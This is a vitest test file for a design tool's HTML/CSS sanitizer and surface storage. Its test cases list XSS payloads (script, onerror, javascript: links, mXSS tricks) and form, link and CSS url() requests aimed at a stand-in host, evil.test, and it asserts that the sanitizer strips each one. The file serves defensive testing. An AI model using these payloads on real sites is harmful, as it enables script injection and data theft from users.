import { mkdtemp, readFile, readdir, rm, stat, writeFile } from "node:fs/promises";
import path from "node:path";
import { tmpdir } from "node:os";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import sharp from "sharp";
import { sanitizeSurface, renderSurface, safeValue } from "./surfaceSanitizer.js";
import { previewSurface, saveSurface, reviseSurface, getSurface, listSurfaces, deleteSurface, surfaceToGap } from "./surfaceStore.js";
import { setWorkspaceRoot } from "./workspace.js";
import { initializeStore, loadWorkspace, getGap, saveFoundation, readGapImage } from "./fileStore.js";
import type { Foundation } from "../shared/model.js";

const faults = vi.hoisted(() => ({ rename: false }));
vi.mock("node:fs/promises", async (original) => {
  const fs = await original<typeof import("node:fs/promises")>();
  return { ...fs, rename: async (from: string, to: string) => { if (faults.rename && to.includes("/surfaces/")) throw new Error("Simulated Surface disk failure"); await fs.rename(from, to); } };
});
const sample = { title: "Exercise library", html: '<main class="panel"><h1>Practice</h1><button style="color:#112233;padding:16px">Start</button></main>', css: ':root{--panel:#ffffff}.panel{background-color:var(--panel);border-radius:8px;display:grid;gap:16px}' };
const foundation: Foundation = { id: "color", name: "Color", status: "selected", description: "", rationale: "", guidance: "", notes: "", order: 0, updated_at: "", tokens: [{ id: "surface", name: "color.surface", foundation: "color", type: "color", level: "semantic", value: "#ffffff", modes: { dark: "#112233" }, description: "", order: 0 }, { id: "text", name: "color.text", foundation: "color", type: "color", level: "semantic", value: "#112233", modes: { dark: "#ffffff" }, description: "", order: 1 }] };
let directory: string;
beforeEach(async () => { faults.rename = false; directory = await mkdtemp(path.join(tmpdir(), "monet-surfaces-")); setWorkspaceRoot(directory); });
afterEach(async () => { await rm(directory, { recursive: true, force: true }); });

describe("Surface feasibility and sanitizer", () => {
  it("keeps structural layout, inline specificity, priority and explicit source mode; mappings change declarations only", async () => {
    const snapshot = await sanitizeSurface({ ...sample, css: sample.css + '@media(prefers-color-scheme:dark){h1{color:red}}@media(min-width:600px){h1{font-size:24px!important}}' });
    const original = renderSurface(snapshot);
    expect(original.document).toContain("display:grid");
    expect(original.document).toContain("@media (max-width:0px)");
    const d = original.declarations.find((d) => d.property === "font-size")!;
    const mapped = renderSurface(snapshot, [{ declaration_id: d.id, token: "type.title", value: "32px" }]);
    expect(mapped.document).toContain("font-size:32px!important");
    expect(mapped.document).toContain('<main class="panel">');
    expect(mapped.document).toContain('style="color:#112233;padding:16px"');
    expect(original.document).toContain("font-size:24px!important");
  });
  it.each([
    '<script>parent.pwned=1</script><img src=x onerror="parent.pwned=1">',
    '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
    '<base href="http://127.0.0.1:43141"><meta http-equiv="refresh" content="0;url=https://evil.test"><link rel=prefetch href=https://evil.test>',
    '<form action="http://127.0.0.1:43141/api/gaps"><input type=hidden value=secret><button formaction=https://evil.test>Send</button></form>',
    '<a href="javascript:alert(1)" ping="https://evil.test" target=_top download>Go</a><iframe src=https://evil.test></iframe>',
    '<object data=https://evil.test></object><video poster=https://evil.test><source src=https://evil.test></video>',
    '<template shadowrootmode=open><script>alert(1)</script><img src=https://evil.test></template><input type=password value=secret>',
  ])("removes active markup and fetch/navigation mechanisms: %s", async (html) => {
    const result = renderSurface(await sanitizeSurface({ title: "Hostile", html })).document;
    expect(result).not.toMatch(/<(script|iframe|svg|math|object|video|template|base|link)\b|onerror=|formaction=|href=|ping=|https:\/\/evil|secret|type="hidden"/i);
    expect(result.indexOf("Content-Security-Policy")).toBeLessThan(result.indexOf("<body>"));
  });
  it.each(['url(https://evil.test)', 'u\\72l(https://evil.test)', 'image-set("https://evil.test" 1x)', 'expression(alert(1))', 'attr(data-secret url)', 'paint(evil)', '"</style><script>alert(1)</script>"'])('rejects hostile CSS value %s including custom properties', async (value) => {
    expect(safeValue("--x", value)).toBe(false);
    const result = renderSurface(await sanitizeSurface({ title: "CSS", html: '<div style="color:red">ok</div>', css: `.x{--payload:${value};background:var(--payload)}@import 'https://evil.test';@font-face{font-family:a;src:url(https://evil.test)}` })).document;
    expect(result).not.toContain("evil.test"); expect(result).not.toContain("<script>");
  });
  it("reports removed attributes, remote assets and unsupported selectors; retains readable content", async () => {
    const s = await sanitizeSurface({ title: "Content", html: '<custom-card data-private="secret"><h2>Visible</h2><img src="https://evil.test/a.png"></custom-card>', css: '[value^="secret"]{background:url(https://evil.test)} .x:hover{color:red}' });
    expect(s.issues.map((i) => i.kind)).toContain("missing_asset");
    expect(s.issues.map((i) => i.kind)).toContain("removed");
    expect(s.input.html).toContain("Visible"); expect(s.input.css).toBe("");
  });
  it("decodes and re-encodes raster bytes, strips metadata and rejects deceptive types and traversal", async () => {
    const image = await sharp({ create: { width: 8, height: 8, channels: 3, background: "red" } }).png().withMetadata().toBuffer();
    const data_url = `data:image/png;base64,${image.toString("base64")}`;
    const s = await sanitizeSurface({ title: "Image", html: '<img src="assets/icon.png">', assets: [{ filename: "assets/icon.png", data_url }], screenshot: { filename: "original.png", data_url } });
    expect(s.input.html).toContain("data:image/webp;base64,"); expect(s.input.assets).toEqual([]);
    const metadata = await sharp(Buffer.from(s.input.screenshot!.data_url.split(",")[1]!, "base64")).metadata();
    expect(metadata.exif).toBeUndefined();
    await expect(sanitizeSurface({ title: "Bad", html: "x", assets: [{ filename: "../private.png", data_url }] })).rejects.toThrow("relative names");
    await expect(sanitizeSurface({ title: "Bad", html: "x", screenshot: { filename: "a.png", data_url: `data:image/png;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>').toString("base64")}` } })).rejects.toThrow("MIME");
  });
  it("allows clip-path inset() for visually-hidden patterns but never a URL, path or external reference", () => {
    expect(safeValue("clip-path", "inset(50%)")).toBe(true);
    for (const value of ["url(#clip)", "url(https://evil.test/x.svg#c)", 'path("M0 0h10v10z")', "circle(50%)"]) expect(safeValue("clip-path", value), value).toBe(false);
  });
  it("bounds tree depth and declaration volume", async () => {
    await expect(sanitizeSurface({ title: "Deep", html: '<div>'.repeat(60) + 'x' + '</div>'.repeat(60) })).rejects.toThrow("depth");
    await expect(sanitizeSurface({ title: "Many", html: "x", css: `.x{${"color:red;".repeat(2001)}}` })).rejects.toThrow("2,000");
  });
});

describe("Surfaces evidence persistence and shared services", () => {
  it("missing evidence reads empty without materializing files; temporary preview also writes nothing", async () => {
    expect(await listSurfaces()).toEqual([]);
    const result = await previewSurface({ input: sample });
    expect(result.run.bindings).toEqual([]); expect(result.run.issues.some((i) => i.kind === "unmapped")).toBe(true);
    expect(await readdir(directory)).toEqual([]);
    expect(result.run.review.scope).toContain("not computed styles");
  });
  it("freezes saved token resolution, detects staleness, uses mode resolution and guards revision conflicts", async () => {
    await initializeStore(); await saveFoundation("color", foundation);
    const temp = await previewSurface({ input: sample });
    const declaration = temp.declarations.find((d) => d.property === "--panel")!;
    const selection = { mappings: [{ declaration_id: declaration.id, token: "color.surface" }], mode: "dark" };
    const saved = await saveSurface({ input: sample, selection });
    expect(saved.run.bindings[0]!.value).toBe("#112233");
    expect(saved.applied).toContain("--panel:#112233"); expect(saved.original).toContain("--panel:#fff");
    const id = saved.saved!.id;
    expect((await stat(path.join(directory, "surfaces", `${id}.json`))).mode & 0o777).toBe(0o600);
    const next = structuredClone(foundation); next.tokens[0]!.modes = { dark: "#223344" }; await saveFoundation("color", next);
    const stale = await getSurface(id); expect(stale.stale).toBe(true); expect(stale.applied).toBe(saved.applied);
    const revised = await reviseSurface(id, { expected_revision: 1, selection });
    expect(revised.run.bindings[0]!.value).toBe("#223344"); expect(revised.run.revision).toBe(2);
    expect((await getSurface(id, 1)).applied).toBe(saved.applied);
    await expect(reviseSurface(id, { expected_revision: 1, selection })).rejects.toThrow("another view");
    expect((await getSurface(id)).saved!.revisions).toEqual([1, 2]);
  });
  it("refuses unknown, duplicate and layout mappings and retains unsafe or deleted token mappings as unresolved", async () => {
    await initializeStore(); await saveFoundation("color", foundation);
    const p = await previewSurface({ input: sample }); const id = p.declarations.find((d) => d.property === "color")!.id;
    for (const mappings of [[{ declaration_id: "missing", token: "color.text" }], [{ declaration_id: id, token: "color.text" }, { declaration_id: id, token: "color.text" }], [{ declaration_id: p.declarations.find((d) => d.property === "display")!.id, token: "color.text" }]]) await expect(previewSurface({ input: sample, selection: { mappings } })).rejects.toThrow();
    const bad = await previewSurface({ input: sample, selection: { mappings: [{ declaration_id: id, token: "missing" }] } });
    expect(bad.run.bindings).toEqual([]); expect(bad.run.issues.some((i) => i.kind === "invalid_mapping")).toBe(true);
  });
  it("copies selected evidence into Gaps without diagnosis and preserves it after Surface deletion", async () => {
    const saved = await saveSurface({ input: sample }); const id = saved.saved!.id;
    const gap = await surfaceToGap(id, { revision: 1, problem: "Start is too quiet", issue_ids: [saved.run.issues[0]!.id] });
    expect(gap.diagnosis).toBeNull(); expect(gap.report.notes).toContain(saved.snapshot.hash); expect(gap.report.usages).toEqual([]);
    await deleteSurface(id); expect(await listSurfaces()).toEqual([]); expect((await getGap(gap.id)).report.problem).toContain("Start");
    await expect(getSurface(id)).rejects.toMatchObject({ code: "ENOENT" });
  });
  it("never enters canonical exports or Workspace and obeys the pending-journal guard", async () => {
    await initializeStore();
    const before = await readFile(path.join(directory, "DESIGN_SYSTEM.md"), "utf8");
    const saved = await saveSurface({ input: { ...sample, title: "PRIVATE_SURFACE_SENTINEL" } });
    expect(JSON.stringify(await loadWorkspace())).not.toContain("PRIVATE_SURFACE_SENTINEL");
    expect(await readFile(path.join(directory, "DESIGN_SYSTEM.md"), "utf8")).toBe(before);
    expect(await readFile(path.join(directory, "design-system.json"), "utf8")).not.toContain("PRIVATE_SURFACE_SENTINEL");
    await writeFile(path.join(directory, "applications", "test.journal.json"), "{}");
    await expect(getSurface(saved.saved!.id)).rejects.toThrow("recovery");
    await expect(deleteSurface(saved.saved!.id)).rejects.toThrow("recovery");
    await expect(saveSurface({ input: sample })).rejects.toThrow("recovery");
  });
  it("does not confuse a malformed record with an empty workspace", async () => {
    await initializeStore(); await writeFile(path.join(directory, "surfaces", "broken.json"), "{");
    await expect(listSurfaces()).rejects.toThrow();
  });
});


describe("Surface adversarial review regressions", () => {
  it("removes hidden subtrees and preserves style media restrictions", async () => {
    const s = await sanitizeSurface({ title: "Hidden", html: '<div hidden>PRIVATE_HIDDEN</div><input type="HIDDEN" value="PRIVATE_VALUE"><style media="print">body{color:red}</style><p>Visible</p>' });
    expect(s.input.html).not.toContain("PRIVATE"); expect(s.input.css).not.toContain("color:red");
    expect(s.issues.some((i) => i.detail.includes("media query"))).toBe(true);
  });
  it("rejects variable expansion bombs, pathological grids and semantically invalid CSS", async () => {
    expect(safeValue("--bomb", "var(--a) var(--a)")).toBe(false);
    expect(safeValue("grid-template-columns", "repeat(10000,10000px)")).toBe(false);
    expect(safeValue("grid-template-columns", "repeat(var(--count),1fr)")).toBe(false);
    expect(safeValue("color", "notacolor")).toBe(false);
    expect(safeValue("padding", "rgb(1,2,3)")).toBe(false);
    expect(safeValue("--" + "a".repeat(1000), "red")).toBe(false);
  });
  it("preserves old bytes and cleans temporary files after a failed comparison save", async () => {
    const saved = await saveSurface({ input: sample }); const id = saved.saved!.id;
    const file = path.join(directory, "surfaces", `${id}.json`); const before = await readFile(file);
    faults.rename = true;
    await expect(reviseSurface(id, { expected_revision: 1, selection: {} })).rejects.toThrow("disk failure");
    expect(await readFile(file)).toEqual(before); expect(await readdir(path.dirname(file))).toEqual([`${id}.json`]);
    faults.rename = false; expect((await getSurface(id)).run.revision).toBe(1);
  });
  it("checks snapshot and run integrity before exposing saved evidence", async () => {
    const saved = await saveSurface({ input: sample }); const id = saved.saved!.id; const file = path.join(directory, "surfaces", `${id}.json`);
    const before = await readFile(file, "utf8"); const record = JSON.parse(before);
    record.snapshot.input.html += '<script>alert(1)</script>'; await writeFile(file, JSON.stringify(record));
    await expect(getSurface(id)).rejects.toThrow("integrity");
    const other = JSON.parse(before); other.runs[0].mode = "dark"; await writeFile(file, JSON.stringify(other));
    await expect(getSurface(id)).rejects.toThrow("revision");
  });
  it("uses the actual light resolution during shared dark conformance review", async () => {
    await initializeStore(); const f = structuredClone(foundation); f.tokens[1]!.modes = { dark: "#eeeeee" }; await saveFoundation("color", f);
    const p = await previewSurface({ input: { title: "Light literal", html: '<p style="color:#112233">Light-only text</p>' }, selection: { mode: "dark" } });
    expect(p.run.review.findings.some((f) => f.check === "light_value_in_other_mode")).toBe(true);
  });
  it("copies a re-encoded screenshot only on explicit selection and retains it after source deletion", async () => {
    const bytes = await sharp({ create: { width: 4, height: 4, channels: 3, background: "blue" } }).png().toBuffer();
    const saved = await saveSurface({ input: { ...sample, screenshot: { filename: "screen.png", data_url: `data:image/png;base64,${bytes.toString("base64")}` } } });
    const id = saved.saved!.id, input = { revision: 1, problem: "Visual report", issue_ids: [saved.snapshot.issues[0]!.id] };
    expect((await surfaceToGap(id, input)).image).toBeNull();
    const gap = await surfaceToGap(id, { ...input, include_screenshot: true });
    await deleteSurface(id); expect((await readGapImage(gap.id)).mediaType).toBe("image/webp");
    expect((await sharp((await readGapImage(gap.id)).contents).metadata()).width).toBe(4);
  });
  // Re-encoding and sanitizing repeated large images needs headroom on CI runners.
  it("handles asset-expanded HTML larger than the raw HTML input limit on save and reload", async () => {
    const noise = Buffer.alloc(600 * 600 * 3); for (let i = 0; i < noise.length; i++) noise[i] = (i * 71 + Math.floor(i / 131)) % 256;
    const image = await sharp(noise, { raw: { width: 600, height: 600, channels: 3 } }).png().toBuffer();
    const data_url = `data:image/png;base64,${image.toString("base64")}`;
    const saved = await saveSurface({ input: { title: "Repeated raster", html: '<img src="a.png">'.repeat(12), assets: [{ filename: "a.png", data_url }] } });
    expect(saved.snapshot.input.html.length).toBeGreaterThan(300000);
    expect((await getSurface(saved.saved!.id)).snapshot.hash).toBe(saved.snapshot.hash);
  }, 30000);
});


it("inserts CSP as the first head child even when captured head attributes contain angle brackets", async () => {
  const s = await sanitizeSurface({ title: "Attributed head", html: '<html><head id="captured" title="a > b"><style>p{color:red}</style></head><body><p>Safe</p></body></html>' });
  const output = renderSurface(s).document;
  expect(output).toMatch(/<head[^]*?<meta http-equiv="Content-Security-Policy"/);
  expect(output.indexOf("Content-Security-Policy")).toBeLessThan(output.indexOf("<style>"));
  expect(output).toContain("script-src 'none'");
});
it("does not collect styles or assets from removed hidden subtrees", async () => {
  const s = await sanitizeSurface({ title: "Hidden subtree", html: '<div hidden><style>p::before{content:"PRIVATE_HIDDEN_CONTENT"}</style><img src="data:image/png;base64,Zm9v"></div><p>Visible</p>' });
  expect(JSON.stringify(s.input)).not.toContain("PRIVATE_HIDDEN_CONTENT");
  expect(s.input.css).toBe("");
});
